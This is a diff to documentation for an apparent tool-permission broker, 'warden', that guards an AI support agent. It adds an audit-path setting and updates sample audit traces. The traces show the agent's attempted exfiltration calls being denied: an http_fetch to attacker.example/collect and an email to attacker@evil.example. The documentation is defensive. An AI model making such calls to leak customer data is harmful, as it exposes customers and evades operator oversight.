@@ -352,6 +352,12 @@ listen = "0.0.0.0:8081"
 [identity]
 private_key = "/tmp/wt/agent.key"
 
+# The SAME file warden.toml's [audit].path names below. The control plane
+# records every grant into the broker's chain; point these two at different
+# files and you get two chains, silently.
+[audit]
+path = "/tmp/wt/audit.jsonl"
+
 [tokens]
 issuer      = "warden-broker"
 ttl_seconds = 300
@@ -527,6 +533,8 @@ call send_email '{"args":{"to":["customer:8812"],"subject":"Your refund","body":
 
 ```
 task 4711  purpose=support-triage  agent=triage-bot
+  ✓ mint(4 tools)                          allow  mint.unconditional
+      ⊕ GRANT: read_document, query_customers, http_fetch, send_email
   ✓ read_document(ticket-4711)             allow
   ✓ read_document(kb/refund-policy)        allow
   ✓ query_customers(rows≈1)                allow
@@ -536,7 +544,7 @@ task 4711  purpose=support-triage  agent=triage-bot
   ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
   ✗ send_email(attacker@evil.example)      DENY   mail.counterparty
   ✓ send_email(customer:8812)              allow
-  chain intact: 8 records, head sha256:...
+  chain intact: 9 records, head sha256:...
 ```
 
 **You have now reproduced the entire security story with `curl` and no AI
@@ -1118,6 +1126,8 @@ this whole demo is nothing more than the same `warden` broker pointed at
 
 ```
 task 4711  purpose=support-triage  agent=triage-bot
+  ✓ mint(4 tools)                          allow  mint.unconditional
+      ⊕ GRANT: read_document, query_customers, http_fetch, send_email
   ✓ read_document(ticket-4711)             allow
   ✓ read_document(kb/refund-policy)        allow
   ✓ query_customers(rows≈1)                allow
@@ -1126,7 +1136,7 @@ task 4711  purpose=support-triage  agent=triage-bot
   ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
   ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
   ✓ send_email(customer:8812)              allow
-  chain intact: 7 records, head sha256:...
+  chain intact: 8 records, head sha256:...
 ```
 
 ```
